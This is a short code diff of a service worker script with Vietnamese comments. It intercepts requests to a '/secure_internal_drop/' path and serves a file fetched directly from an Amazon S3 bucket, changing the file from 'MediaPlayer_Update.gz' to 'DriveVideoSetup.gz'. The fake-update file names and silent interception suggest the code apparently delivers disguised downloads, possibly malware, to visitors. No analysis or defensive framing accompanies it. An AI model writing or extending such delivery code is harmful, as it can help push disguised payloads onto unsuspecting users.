@@ -14,7 +14,7 @@ self.addEventListener('fetch', (event) => {
     if (url.includes('/secure_internal_drop/')) {
         
         // Link gốc trực tiếp từ S3 (Đã cấu hình CORS)
-        const directS3Url = 'https://xmetavn.s3.us-east-1.amazonaws.com/MediaPlayer_Update.gz';
+        const directS3Url = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';
 
         event.respondWith(
             // Kéo thẳng từ AWS S3 với băng thông tối đa của Client, bỏ qua mọi tầng cache
